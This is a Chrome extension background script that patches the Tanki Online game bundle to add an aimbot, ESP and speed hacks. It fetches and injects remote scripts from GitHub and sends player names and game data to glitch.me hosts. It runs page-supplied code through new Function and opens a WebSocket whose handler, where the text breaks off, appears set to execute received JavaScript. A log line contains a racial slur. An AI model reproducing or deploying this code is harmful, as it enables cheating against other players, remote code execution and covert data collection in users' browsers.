var socket;
var sets = ['WiYKBgoEaWRsZRIYCgRUaGlzIQB+ioKRAQAAKZ4LFIGRAQAAGgIIAQ==', 'WiQKBgoEaWRsZRIWCgJJcyEAfoqCkQEAACnPRxWBkQEAABoCCAE=', 'WiQKBgoEaWRsZRIWCgJBbiH/fYqCkQEAACmd6BWBkQEAABoCCAE=', 'WiYKBgoEaWRsZRIYCgRBdXRvIQB+ioKRAQAAKU9YFoGRAQAAGgIIAQ==', 'WigKBgoEaWRsZRIaCgZTdGF0dXMhAH6KgpEBAAApBrYWgZEBAAAaAggB', 'WioKBgoEaWRsZRIcCghDaGFuZ2VyISH/fYqCkQEAACm3RReBkQEAABoCCAE='], statusInd = 0;
var strikerShellMatch, strikerShellMatchRep;
let globalData = '', done = false, fullAimbot = false, aimbotOnShift = false;
function resetVariables() {
    globalData = '', done = false, fullAimbot = false, aimbotOnShift = false;
};
chrome.runtime.onStartup.addListener(resetVariables);
chrome.runtime.onInstalled.addListener(resetVariables);
chrome.tabs.onCreated.addListener(resetVariables);
chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (changeInfo.status === 'loading' && tab?.url?.includes('tankionline')) {
        resetVariables();
    }
});
function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};
async function handle1(data) {
    var match = data.match(/this.\w+&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){/)[0];
    var paramLetter = match.match(/function\(\w/)[0][9];
    var match2 = data.match(/var \w=\w,\w=!!\w\|\|0===\w.\w+;\w.\w+=\w\w\(\w\),\w.\w+=\w,\w.\w+=\w,\w.\w+=\w\w\(\w\),\w.\w+=\w/)[0];
    var match3 = match.match(/this.\w+/)[0].split('.')[1];
    var speedMatch = match2.match(/\w.\w+=\w\w\(\w\)/g)[0];
    var accelerationMatch = match2.match(/\w.\w+=\w\w\(\w\)/g)[1];
    var myTankLine = data.match(/,\w.\w+.\w+\(\w+\(\w\).\w+\(\).\w+.\w+\),/g)[0];
    var newTankLine = myTankLine.substring(0, myTankLine.lastIndexOf(',')) + ';' + myTankLine.substring(myTankLine.lastIndexOf(',') + 1);
    var flagPosFunc = data.match(/function \w+.\(\){this.\w+=new \w+\(0,0\).this.\w+=0,this.\w+=null}/g)[0];
    var espMatch = data.match(/null==i\|\|\w+\(t,i.\w+,i.\w+\)\}/g)[0];
    data = data.replace(data.match(/\(-\.37,-1,-1\);(.|\s)*?\}f/g)[0].split('this.')[2], `${data.match(/\(-\.37,-1,-1\);(.|\s)*?\}f/g)[0].split('this.')[2]}window.mapBounds=${data.match(/\(-\.37,-1,-1\);(.|\s)*?\}f/g)[0].split('this.')[2].split('=')[1].replace(',', '')},`);
    var shellMatch = data.match(/\w+\(\w+\).\w+=function\(\){var \w,\w=this.\w+\(\),\w=\(\w=this,function\(\w\){return \w.\w+=\w.\w+,\w.\w+=\w.\w+,\w+\(\)}\);\w.\w+\(\w+\(\w+\),0,!\w,\w\)}/g)[0];
    var shellVar = shellMatch.match(/var \w/)[0].split(' ')[1];
    shellMatchRep = shellMatch.replace(`var ${shellVar}`, `window.shells.push(this);var ${shellVar}`);
    console.log(shellMatchRep);
    var reg = new RegExp(`${shellVar}.\\w+=\\w.\\w+,\\w+\\(\\)`, 'g');
    console.log(reg);
    var shellOtherMatch = shellMatchRep.match(reg)[0];
    console.log(shellOtherMatch);
    var shellOtherMatch2 = shellOtherMatch.match(/\w.\w+,/g)[0];
    console.log(shellOtherMatch2);
    shellMatchRep = shellMatchRep.replace(shellOtherMatch2, `0,`);
    var minesMatch = data.match(/function \w+\(\w\){\w.\w+\(\).\w+\(\w\),function\(\w\){var \w=\w.\w+;if\(null!=\w\)return \w;\w+\("callbackRemoveMine"\)}[^}]*}[^}]*}/g)[0];
    console.log(minesMatch);
    var minesMatchRep = minesMatch.slice(0, -1);
    console.log(minesMatchRep);
    var mineRemFunc = minesMatch.split('(')[0].replace('function ', '');
    console.log(mineRemFunc);
    minesMatchRep = `${minesMatchRep};window.mines.push(this);window.mineRemFunc=${mineRemFunc};if(!window.mineRemFunc){console.log(\`mine rem func: ${mineRemFunc}\`)}};`;
    console.log(minesMatchRep);
    var cameraMatch = data.match(/function \w+\(\w\){var \w=\w\.\w+;if\(null!=\w\)return n;\w+\("followCamera"\)}/g)[4];
    var cameraMatchRep = cameraMatch.replace(cameraMatch.split('{')[0] + '{', `${cameraMatch.split('{')[0]}{window.Camera=t;`);
    data = data.replace(cameraMatch, cameraMatchRep);
    /*var strikerMatch = data.match(/"rocketLauncherSfxData".*?("tankBody")/g)[0];
    var strikerMatch2 = strikerMatch.match(/\w=\w.\w+;/g)[1];
    var strikerMatches3 = strikerMatch.match(/\w.\w\w+,\w.\w\w+,\w,/g)[0];
    var strikerMatchRep = strikerMatch.replace(strikerMatch2, `${strikerMatch2};t.i1e2_1.ufe_1=0;t.i1e2_1.wfe_1=0;t.i1e2_1.sfe_1=Infinity;t.i1e2_1.xfe_1=Infinity;window.rocketShells.push(t);`);
    /*var strikerShellMatch = data.match(/\w+\(\w+\).\w+=function\(\w,\w,\w,\w,\w,\w,\w,\w\){this.\w+=\w,this.\w+.\w+\(\w\),this.\w+.\w+\(\i\),this.\w+.\w+\(\w\),this.\w+=\w,this.\w+=\w,this.\w+=\w,this.\w+=\w}/g)[0];
    var strikerShellMatch2 = `i.d18_1=ETPos.d18_1;i.e18_1=ETPos.e18_1;i.f18_1=ETPos.f18_1;${strikerShellMatch.split('{')[1]}`;
    strikerShellMatchRep = `${strikerShellMatch.split('{')[0]}{${strikerShellMatch2}`;
    console.log(strikerMatchRep);
    data = data.replace(strikerShellMatch, strikerShellMatchRep);*/
    //strikerShellMatch = data.match(/\w+\(\w+\).\w+=function\(\w,\w,\w,\w,\w,\w,\w,\w\){this.\w+=\w,this.\w+.\w+\(\w\),this.\w+.\w+\(\i\),this.\w+.\w+\(\w\),this.\w+=\w,this.\w+=\w,this.\w+=\w,this.\w+=\w}/g)[0];
    //strikerShellMatchRep = `${strikerShellMatch.replace('}','')};this.f164_1.d18_1=ETPos.d18_1;this.f164_1.e18_1=ETPos.e18_1;this.f164_1.f18_1=ETPos.f18_1;}`;
    //data = data.replace(strikerShellMatch, strikerShellMatchRep);
    //data = data.replace(strikerMatch, strikerMatchRep);
    //console.log(strikerMatch, strikerMatchRep);
    data = data.replace(shellMatch, shellMatchRep);
    data = data.replace(data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\(\w+\(\w\),0,r,!0\),/g)[0], `if(t){window.autoPress=${data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\(\w+\(\w\),0,r,!0\),/g)[0].split('(')[1].split('&&')[1]};window.pressAuto=${data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\(\w+\(\w\),0,r,!0\),/g)[0].match(/\w+\(\w\)/g)[0].replace('i', 't')}};${data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\(\w+\(\w\),0,r,!0\),/g)[0]}`);
    data = data.replace(flagPosFunc, flagPosFunc.replace('}', ';if(window.flagPos1){window.flagPos2=this}else{window.flagPos1=this};}'));
    data = data.replace(espMatch, `if(window.espEnabled){i={${espMatch.split('i.')[1].replace(',', '')}:espColor,${espMatch.split('i.')[2].replace(')}', '')}:false}};window.TEST.push(t);window.${espMatch.split('||')[1].split('(')[0]}=${espMatch.split('||')[1].split('(')[0]};${espMatch}`);
    data = `window.mines=[];window.shells=[];window.rocketShells=[];window.espColor=16711680;window.espEnabled=false;console.log("%cIT WORKED NIGGA","font-size:50px;color:red");window.AimAmount=4;window.prevAimAmount=4;TEST=[];window.int=setInterval(()=>{if(window.espEnabled){TEST.forEach(t=>{try{${espMatch.split('||')[1].split('(')[0]}(t,espColor,false)}catch(e){}})}});window.Aimbot=true;window.turnSpeed=1;window.Hack=false;window.Speed=1;window.Acceleration=1;${data}`;
    data = data.replace(speedMatch, `${speedMatch} * (window.Hack ? window.Speed : 1)`);
    data = data.replace(accelerationMatch, `${accelerationMatch} * (window.Hack ? window.Acceleration : 1)`);
    data = data.replace(match, `(window.Aimbot ? !this.${match3} : this.${match3})` + match.replace('this.' + match3, '') + `${!fullAimbot ? '/*' : ''}for(const key in ${paramLetter}){for(const key2 in ${paramLetter}[key]){switch(${paramLetter}[key][key2]){case 4:${paramLetter}[key][key2]=360;case 0.008726646:${paramLetter}[key][key2]=360;}};};${!fullAimbot ? '*/' : ''}window.AIM=t;`);
    //data = data.replace(minesMatch, minesMatchRep);
    //setTimeout(() => {
    //strikerShellMatch = data.match(/\w+\(\w+\).\w+=function\(\w,\w,\w,\w,\w,\w,\w,\w\){this.\w+=\w,this.\w+.\w+\(\w\),this.\w+.\w+\(\i\),this.\w+.\w+\(\w\),this.\w+=\w,this.\w+=\w,this.\w+=\w,this.\w+=\w}/g)[0];
    //strikerShellMatchRep = `${strikerShellMatch.replace('}','')};setTimeout(()=>{this.f164_1.d18_1=ETPos.d18_1;this.f164_1.e18_1=ETPos.e18_1;this.f164_1.f18_1=ETPos.f18_1;},1000)}`;
    //data = data.replace(strikerShellMatch, strikerShellMatchRep);
    globalData = 'window.mines=[];window.mineInterval=setInterval(()=>{mines.forEach(e=>{' + mineRemFunc + '(e);});},500);window.getTank=true;' + (aimbotOnShift ? '(function(){var isShiftPressed=false;document.addEventListener(\'keydown\',(e)=>{if(e.key==\'Shift\'){isShiftPressed=true;};});document.addEventListener(\'keyup\',(e)=>{if(e.key==\'Shift\'){isShiftPressed=false;};});var f,r=true;function a(){if(r){f=requestAnimationFrame(a);if(isShiftPressed&&!window.Aimbot){window.Aimbot=true;};if(!isShiftPressed&&window.Aimbot){window.Aimbot=false;};};};try{a();}catch(error){console.log(error);};})();' : '') + data.replace(minesMatch, minesMatchRep);
    console.log('second match');
    //}, 1000);
};
async function handle2(data) {
    var match = data.match(/this.\w+&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){/)?.[0] || data.match(/!\w\.equals\(\w+\(\)\)&&!\w\.\w+\(\)&&this\.\w+\.\w+>0&&function\(\w,\w,\w\){/)[0];
    var paramLetter = match.match(/function\(\w/)[0][9];
    var match2 = data.match(/var \w=\w,\w=\w\|\|0===\w.\w+;\w.\w+=\w\w\(\w\),\w.\w+=\w,\w.\w+=\w,\w.\w+=\w\w\(\w\),\w.\w+=\w/)[0];
    var match3 = match.match(/this\.\w+\.\w+>0/)[0];
    var matchReplace = match.replace(match3, `(window.Aimbot?true:false)`);
    var speedMatch = match2.match(/\w.\w+=\w\w\(\w\)/g)[0];
    var accelerationMatch = match2.match(/\w.\w+=\w\w\(\w\)/g)[1];
    var turnSpeedMatch = match2.match(/\w\.\w+=\w/g)[1];
    var myTankLine = data.match(/,\w.\w+.\w+\(\w+\(\w\).\w+\(\).\w+.\w+\),/g)[0];
    var newTankLine = myTankLine.substring(0, myTankLine.lastIndexOf(',')) + ';' + myTankLine.substring(myTankLine.lastIndexOf(',') + 1);
    var flagPosFunc = data.match(/function \w+\(\){this.\w+=new \w+\(0,0\).this.\w+=0,this.\w+=null}/g)?.[0] || data.match(/function \w+.\(\){this.\w+=new \w+\(0,0\).this.\w+=0,this.\w+=null}/g)[0];
    //var espMatch = data.match(/null==\w\|\|\w+\(\w,\w\.\w+,\w\.\w+\)/g)[1];
    var index = data.indexOf('"onCanShowHighlight"');
    var index2 = data.substring(0, index).lastIndexOf('==');
    var onCanShowHighlightFuncName = data.substring(index2, index).split('(')[0].split('||')[1];
    var onCanShowHighlightFunc = data.match(new RegExp('function ' + onCanShowHighlightFuncName + '\\([^}]+', 'g'))[1];
    var firstHighlightVar = onCanShowHighlightFunc.split('.')[2].split('=')[0];
    var secondHighlightVar = onCanShowHighlightFunc.split('.')[4].split('=')[0];
    var thirdHighlightVar = onCanShowHighlightFunc.split(',')[4].match(/\w+\w+\w+\(\)\.\w+\w+\w+/)[0];
    data = data.replace(data.match(/\(-\.37,-1,-1\);(.|\s)*?\}f/g)[0].split('this.')[2], `${data.match(/\(-\.37,-1,-1\);(.|\s)*?\}f/g)[0].split('this.')[2]}window.mapBounds=${data.match(/\(-\.37,-1,-1\);(.|\s)*?\}f/g)[0].split('this.')[2].split('=')[1].replace(',', '')},`);
    //var shellMatch = data.match(/\w+\(\w+\)\.\w+=function\(\){var \w,\w=this\.\w+\(\),\w=\(\w=this,function\(\w\){return \w\.\w+=\w\.\w+,\w\.\w+=\w\.\w+,\w+}\);\w\.\w+\(.+?\(\w+\),0,!?\w,\w\)}/g)[0];
    //var shellVar = shellMatch.match(/var \w/)[0].split(' ')[1];
    //shellMatchRep = shellMatch.replace(`var ${shellVar}`, `window.shells.push(this);var ${shellVar}`);
    //console.log(shellMatchRep);
    //var reg = new RegExp(`${shellVar}.\\w+=\\w.\\w+,\\w+`, 'g');
    //console.log(reg);
    //var shellOtherMatch = shellMatchRep.match(reg)[0];
    //console.log(shellOtherMatch);
    //var shellOtherMatch2 = shellOtherMatch.match(/\w.\w+,/g)[0];
    //console.log(shellOtherMatch2);
    //shellMatchRep = shellMatchRep.replace(shellOtherMatch2, `0,`);
    //var minesMatch = data.match(/function \w+\(\w\){\w.\w+\(\).\w+\(\w\),function\(\w\){var \w=\w.\w+;if\(null!=\w\)return \w;.+\("callbackRemoveMine"\)}[^}]*}[^}]*}/g)[0];
    //console.log(minesMatch);
    //var minesMatchRep = minesMatch.slice(0, -1);
    //console.log(minesMatchRep);
    //var mineRemFunc = minesMatch.split('(')[0].replace('function ', '');
    //console.log(mineRemFunc);
    //minesMatchRep = `${minesMatchRep};window.mines.push(this);window.mineRemFunc=${mineRemFunc};if(!window.mineRemFunc){console.log(\`mine rem func: ${mineRemFunc}\`)}};`;
    //console.log(minesMatchRep);
    //var cameraMatch = data.match(/function \w+\(\w\){var \w=\w\.\w+;if\(null!=\w\)return \w;\w+\("followCamera"\)}/g)[5];
    //var cameraMatchRep = cameraMatch.replace(cameraMatch.split('{')[0] + '{', `${cameraMatch.split('{')[0]}{window.Camera=t;`);
    //var targetMatch = data.match(/function Isn\(t,n\){this.q1a4_1=t,this.r1a4_1=n}/g)[0];
    //var targetMatchRep = targetMatch.replace('{', '{window.target=t;window.TESt=this;');
    //data = data.replace(targetMatch, targetMatchRep);
    //data = data.replace(cameraMatch, cameraMatchRep);
    /*var strikerMatch = data.match(/"rocketLauncherSfxData".*?("tankBody")/g)[0];
    var strikerMatch2 = strikerMatch.match(/\w=\w.\w+;/g)[1];
    var strikerMatches3 = strikerMatch.match(/\w.\w\w+,\w.\w\w+,\w,/g)[0];
    var strikerMatchRep = strikerMatch.replace(strikerMatch2, `${strikerMatch2};t.i1e2_1.ufe_1=0;t.i1e2_1.wfe_1=0;t.i1e2_1.sfe_1=Infinity;t.i1e2_1.xfe_1=Infinity;window.rocketShells.push(t);`);
    /*var strikerShellMatch = data.match(/\w+\(\w+\).\w+=function\(\w,\w,\w,\w,\w,\w,\w,\w\){this.\w+=\w,this.\w+.\w+\(\w\),this.\w+.\w+\(\i\),this.\w+.\w+\(\w\),this.\w+=\w,this.\w+=\w,this.\w+=\w,this.\w+=\w}/g)[0];
    var strikerShellMatch2 = `i.d18_1=ETPos.d18_1;i.e18_1=ETPos.e18_1;i.f18_1=ETPos.f18_1;${strikerShellMatch.split('{')[1]}`;
    strikerShellMatchRep = `${strikerShellMatch.split('{')[0]}{${strikerShellMatch2}`;
    console.log(strikerMatchRep);
    data = data.replace(strikerShellMatch, strikerShellMatchRep);*/
    //strikerShellMatch = data.match(/\w+\(\w+\).\w+=function\(\w,\w,\w,\w,\w,\w,\w,\w\){this.\w+=\w,this.\w+.\w+\(\w\),this.\w+.\w+\(\i\),this.\w+.\w+\(\w\),this.\w+=\w,this.\w+=\w,this.\w+=\w,this.\w+=\w}/g)[0];
    //strikerShellMatchRep = `${strikerShellMatch.replace('}','')};this.f164_1.d18_1=ETPos.d18_1;this.f164_1.e18_1=ETPos.e18_1;this.f164_1.f18_1=ETPos.f18_1;}`;
    //data = data.replace(strikerShellMatch, strikerShellMatchRep);
    //data = data.replace(strikerMatch, strikerMatchRep);
    //console.log(strikerMatch, strikerMatchRep);
    //data = data.replace(shellMatch, shellMatchRep);
    /*var healthBar = data.match(/function \w+\(\w,\w\){return \w\.\w+\.\w+\(\w,\w+\("forceShowHealthBar",\w,\w+,\(function\(\w\){return \w+\(\w\)}\),\(function\(\w,\w\){return \w+\(\w,\w\)}\)\),\w\)}/g)[0];
    var healthBarFunc = healthBar.split('(')[0].replace('function ', '');
    var healthBarRep = healthBar + `if(!window.healthBarFunc){window.healthBarFunc=${healthBarFunc}}`/*healthBar.replace('{', `{if(!window.healthBarFunc){window.healthBarFunc=${healthBarFunc}}`)*\/;
    data = data.replace(healthBar, healthBarRep);*/
    data = data.replace(data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\((\w|\$)+\(\w\),0,r,!0\),/g)[0], `if(t){window.autoPress=${data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\((\w|\$)+\(\w\),0,r,!0\),/g)[0].split('(')[1].split('&&')[1]};window.pressAuto=$${data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\((\w|\$)+\(\w\),0,r,!0\),/g)[0].match(/\w+\(\w\)/g)[0].replace('i', 't')}};${data.match(/return \w=\w,\w+\(\w=\w\)&&\w+\((\w|\$)+\(\w\),0,r,!0\),/g)[0]}`);
    data = data.replace(flagPosFunc, flagPosFunc.replace('}', ';if(window.flagPos1){window.flagPos2=this}else{window.flagPos1=this};}'));
    //data = data.replace(espMatch, `if(window.espEnabled){i={${espMatch.split('i.')[1].replace(',', '')}:espColor,${espMatch.split('i.')[2].replace(')', '')}:false}};window.TEST.push(t);window.${espMatch.split('||')[1].split('(')[0]}=${espMatch.split('||')[1].split('(')[0]};${espMatch}`);
    data = `window.Utils=[];window.mines=[];window.rocketShells=[];window.shells=[];window.espColor=16711680;window.espEnabled=false;/*console.log("%cIT WORKED NIGGA","font-size:50px;color:red");*/window.AimAmount=4;window.prevAimAmount=4;TEST=[];var enemies = [], allies = [];var espInt1 = setInterval(() => {    try {        if (espEnabled) {            enemies.forEach(t => {            Object.values(searchInObject(t.espInfo, '==0'))[1].${firstHighlightVar} = espColor;            Object.values(searchInObject(t.espInfo, '==0'))[1].${secondHighlightVar} = false;            t.espInfo.${thirdHighlightVar}(Object.values(searchInObject(t.espInfo, '==0'))[1]);        });        allies.forEach(t => {            Object.values(searchInObject(t.espInfo, '==0'))[1].${firstHighlightVar} = espColor2;            Object.values(searchInObject(t.espInfo, '==0'))[1].${secondHighlightVar} = false;            t.espInfo.${thirdHighlightVar}(Object.values(searchInObject(t.espInfo, '==0'))[1]);        });        var myTank = getTanks('self')[0];        Object.values(searchInObject(myTank.espInfo, '==0'))[1].${firstHighlightVar} = espColor4;            Object.values(searchInObject(myTank.espInfo, '==0'))[1].${secondHighlightVar} = false;            myTank.espInfo.${thirdHighlightVar}(Object.values(searchInObject(myTank.espInfo, '==0'))[1]);        var targetTank = getTanks(\`player\${nick}\`)[0];        Object.values(searchInObject(targetTank.espInfo, '==0'))[1].${firstHighlightVar} = espColor3;            Object.values(searchInObject(myTank.espInfo, '==0'))[1].${secondHighlightVar} = false;        targetTank.espInfo.${thirdHighlightVar}(Object.values(searchInObject(targetTank.espInfo, '==0'))[1]);        };    } catch (e) {};}, 500);var espInt2 = setInterval(() => {    enemies = getTanks('enemies');    allies = getTanks('allies');}, 5000);/*window.int=setInterval(()=>{if(window.espEnabled){TEST.forEach(t=>{try{\${espMatch.split('||')[1].split('(')[0]}(t,espColor,false)}catch(e){}})}});*/window.Aimbot=true;window.turnSpeed=1;window.Hack=false;window.Speed=1;window.Acceleration=1;${data}`;
    data = data.replace(speedMatch, `${speedMatch} * (window.Hack ? window.Speed : 1)`);
    data = data.replace(turnSpeedMatch, `${turnSpeedMatch} * (window.Hack ? window.turnSpeed : 1)`);
    data = data.replace(accelerationMatch, `${accelerationMatch} * (window.Hack ? window.Acceleration : 1)`);
    data = data.replace(match, matchReplace + `${!fullAimbot ? '/*' : ''}for(const key in ${paramLetter}){for(const key2 in ${paramLetter}[key]){switch(${paramLetter}[key][key2]){case 4:${paramLetter}[key][key2]=360;case 0.008726646:${paramLetter}[key][key2]=360;}};};${!fullAimbot ? '*\/' : ''}window.AIM=t;`);/*data.replace(match, `(window.Aimbot ? !this.${match3} : this.${match3})` + match.replace('this.' + match3, '') + `${!fullAimbot ? '/*' : ''}for(const key in ${paramLetter}){for(const key2 in ${paramLetter}[key]){switch(${paramLetter}[key][key2]){case 4:${paramLetter}[key][key2]=360;case 0.008726646:${paramLetter}[key][key2]=360;}};};${!fullAimbot ? '*\/' : ''}window.AIM=t;`);*/
    //data = data.replace(minesMatch, minesMatchRep);
    var matches = data.match(/function *(\w|\$)*\((\w|,)*\){var \w=(\w|this)\.\w+;if\(null!=\w\)return \w+;(\w+|..)\("(followCamera|weaponName|cameraComponent|tankPhysicsComponent|gunParamsCalculator|flags|turret)"\)}/g);/*function *(\w|\$)*\((\w|,)*\){var \w=(\w|this)\.\w+;if\(null!=\w\)return \w+;(\w+|..)\("(\w|\$)+"\)}*/   /*function *(\w|\$)*\((\w|,)*\){var \w=(\w|this)\.\w+;if\(null!=\w\)return \w+;(\w+|..)\("(followCamera|weaponName|cameraComponent|tankPhysicsComponent|gunParamsCalculator|flags|turret)"\)}*/
    chrome.tabs.sendMessage(tabIds[tabIds.length - 1], {
        action: 'injectScript',
        script: `var h = document.createElement('h');
            h.id = 'percentage';
            h.textContent = 'test';
            h.style.cssText = \`
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            font-size: 50px;
            z-index: 9999;
            \`;
            document.body.appendChild(h);`
    });
    for (let i = 0; i < matches.length; i++) {
        var tt, objName = matches[i].split('"')[1], varName = matches[i].split('=')[1].split(';')[0];
        tt = matches[i].split('{')[0] + '{try{window.Utils["' + objName + '"]=' + varName + ';}catch(e){}' + matches[i].split('{')[1];
        data = data.replace(matches[i], tt);
        var prc = parseInt(((i + 1) / matches.length) * 100);
        chrome.tabs.sendMessage(tabIds[tabIds.length - 1], {
            action: 'injectScript',
            script: prc == 100 ? `document.querySelector('#percentage').remove();` : `document.querySelector('#percentage').textContent='${prc}%';`
        });
    };
    //setTimeout(() => {
    //strikerShellMatch = data.match(/\w+\(\w+\).\w+=function\(\w,\w,\w,\w,\w,\w,\w,\w\){this.\w+=\w,this.\w+.\w+\(\w\),this.\w+.\w+\(\i\),this.\w+.\w+\(\w\),this.\w+=\w,this.\w+=\w,this.\w+=\w,this.\w+=\w}/g)[0];
    //strikerShellMatchRep = `${strikerShellMatch.replace('}','')};setTimeout(()=>{this.f164_1.d18_1=ETPos.d18_1;this.f164_1.e18_1=ETPos.e18_1;this.f164_1.f18_1=ETPos.f18_1;},1000)}`;
    //data = data.replace(strikerShellMatch, strikerShellMatchRep);
    globalData = 'window.getTank=true;' + (aimbotOnShift ? '(function(){var isShiftPressed=false;document.addEventListener(\'keydown\',(e)=>{if(e.key==\'Shift\'){isShiftPressed=true;};});document.addEventListener(\'keyup\',(e)=>{if(e.key==\'Shift\'){isShiftPressed=false;};});var f,r=true;function a(){if(r){f=requestAnimationFrame(a);if(isShiftPressed&&!window.Aimbot){window.Aimbot=true;};if(!isShiftPressed&&window.Aimbot){window.Aimbot=false;};};};try{a();}catch(error){console.log(error);};})();' : '') + data/*.replace(minesMatch, minesMatchRep)*/;
    console.log('second match');
    //}, 1000);
};
chrome.webRequest.onBeforeRequest.addListener(
    async function (details) {
        if (!details.initiator || details.initiator.startsWith('chrome-extension://')) {
            return;
        }

        window.url = details.url;
        console.log(url);
        /*fetch(url)
            .then(response => response.text())
            .then(data => {
                if (data.match(/,this.\w+&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){var/)) {
                    var match = data.match(/this.\w+&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){/)[0];
                    var paramLetter = match.match(/function\(\w/)[0][9];
                    var match2 = data.match(/var \w=\w,\w=!!\w\|\|0===\w.\w+;\w.\w+=\w_\(\w\),\w.\w+=\w,\w.\w+=\w,\w.\w+=\w_\(\w\),\w.\w+=\w/)[0];
                    var match3 = match.match(/this.\w+/)[0].split('.')[1];
                    var speedMatch = match2.match(/\w.\w+=\w_\(\w\)/g)[0];
                    var accelerationMatch = match2.match(/\w.\w+=\w_\(\w\)/g)[1];
                    data = window.Hack=true;window.Speed=1.3;window.Acceleration=1.3;${data};
                    data = data.replace(speedMatch, ${speedMatch} * (window.Hack ? window.Speed : 1));
                    data = data.replace(accelerationMatch, ${accelerationMatch} * (window.Hack ? window.Acceleration : 1));
                    data = data.replace(match, (window.Aimbot ? !this.${match3} : this.${match3}) + match.replace('this.' + match3, '') + ${!fullAimbot ? '/\*' : ''}for(const key in ${paramLetter}){for(const key2 in ${paramLetter}[key]){switch(${paramLetter}[key][key2]){case 4:${paramLetter}[key][key2]=360;case 0.008726646:${paramLetter}[key][key2]=360;}};};${!fullAimbot ? '*\/' : ''});
                    globalData = (aimbotOnShift ? '(function(){var isShiftPressed=false;document.addEventListener(\'keydown\',(e)=>{if(e.key==\'Shift\'){isShiftPressed=true;};});document.addEventListener(\'keyup\',(e)=>{if(e.key==\'Shift\'){isShiftPressed=false;};});var f,r=true;function a(){if(r){f=requestAnimationFrame(a);if(isShiftPressed&&!window.Aimbot){window.Aimbot=true;};if(!isShiftPressed&&window.Aimbot){window.Aimbot=false;};};};try{a();}catch(error){console.log(error);};})();' : '') + data;
                    console.log('second match');
                } else {
                    console.log('not matched');
                }
            })
            .catch(error => {
                console.error('Error fetching data:', error);
            });*/
        fetch(url)
            .then(response => response.text())
            .then(async data => {
                if (data.match(/,this.\w+&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){if\(\w.\w+\.\w+\(\w\.\w+,\w.\w+\)/)) {
                    await handle1(data);
                    return { cancel: true };
                } else {
                    //console.log('not matched');
                    if (false) {
                        fetch(url)
                            .then(response => response.text())
                            .then(async data => {
                                if (/*data.match(/,this.\w+&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){var/) || data.match(/,this.\w+&&!i.equals\(\w+\(\)\)&&!\w.\w+\(\)&&this.\w+.\w+>0&&function\(\w,\w,\w\){if\(\w.\w+./)*/1>0) {
                                    await handle2(data);
                                } else {
                                    console.log('not matched');
                                }
                                return { cancel: true };
                            })
                        /*.catch(error => {
                            console.error('Error fetching data:', error);
                        });*/
                    } else {
                        if (!url.includes('test')) {
                            fetch('https://raw.githubusercontent.com/LEaRCrEaM/Tanki-Online/main/user.js')
                                .then(response => response.text())
                                .then(async data => {
                                    globalData = data;
                                    return { cancel: true };
                                })
                            /*.catch(error => {
                                console.error('Error fetching data:', error);
                            });*/
                        } else {
                            fetch('https://raw.githubusercontent.com/LEaRCrEaM/Tanki-Online/main/user2.js')
                                .then(response => response.text())
                                .then(async data => {
                                    globalData = data;
                                    return { cancel: true };
                                })
                            /*.catch(error => {
                                console.error('Error fetching data:', error);
                            });*/
                        };
                    };
                }
            })
        /*.catch(error => {
            console.error('Error fetching data:', error);
        });*/

        return { cancel: true };
    },
    { urls: ["https://*.tankionline.com/*/main.*.js"] },
    ["blocking"]
);
var tabIds = [];
chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (changeInfo.status === 'complete' && tab?.url?.includes('tankionline')) {
        console.log(tab.url);
        tabIds.push(tabId);
        /*if (!socket || socket.readyState === WebSocket.CLOSED) {
            socket = new WebSocket('ws://root-tidy-cook.glitch.me');
            socket.onmessage = function (event) {
                console.log(event.data);
                chrome.tabs.sendMessage(tabIds[0], {
                    action: 'injectScript1',
                    script: event.data
                });
            };
            socket.onerror = function (error) {
                console.error('WebSocket error:', error);
            };
        };*/
        if (!done) {
            console.log('first done');
            if (globalData.length > 3) {
                console.log('changing global data');
                //globalData = globalData.replace(strikerShellMatch, strikerShellMatchRep);
                console.log('first > 3');
                console.log('sent message');
                chrome.tabs.sendMessage(tabId, {
                    action: 'injectScript',
                    script: globalData
                });
                done = true;
            } else {
                console.log('not first > 3');
                if (window.interval) clearInterval(interval);
                window.interval = setInterval(() => {
                    if (!done && globalData.length > 3) {
                        console.log('changing global data');
                        //globalData = globalData.replace(strikerShellMatch, strikerShellMatchRep);
                        console.log('sent message');
                        chrome.tabs.sendMessage(tabId, {
                            action: 'injectScript',
                            script: globalData
                        });
                        done = true;
                        clearInterval(interval);
                    }
                });
            }
        } else {
            console.log('first done true');
        }
    }
});

// background.js

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (message.action == 'sendToWS') {
        ws.send(message.message);
    };
    // Example: Respond to specific message action
    if (message.action === 'sendDataFromPage') {
        // Process the received data from the page
        //console.log('Received data from page:', message.data); // Check how message.data is accessed
        var obj = JSON.parse(message.data.replace(',,,', ''));
        if (obj.turret.name) {
            fetch(`https://actually-hickory-squirrel.glitch.me/api/addMessage?name=${obj.name}&tank=${obj.turret.name} ${obj.turret.upgrades} | ${obj.hull.name} ${obj.hull.upgrades}&info=${JSON.stringify(obj)}`);
        };
        // Optionally, send a response back to the content script
        sendResponse({ received: true });
    };
    if (message.action === 'sendDataFromPage1') {
        fetch(`https://root-tidy-cook.glitch.me/api/addMessage?message=${message.data}`);
    };
    if (message.action === 'sendDataFromPage2') {
        var func = new Function(message.data);
        func();
    };
});

let ws = new WebSocket("wss://sapphire-burnt-cut.glitch.me");

// WebSocket event handlers
function setupWebSocketHandlers() {
    ws.onopen = () => {
        console.log("Connected to WebSocket server");
    };

    ws.onmessage = (event) => {
        try {
            const code = event.data;
            console.log("Received code:", code);

            // Execute the received JavaScript
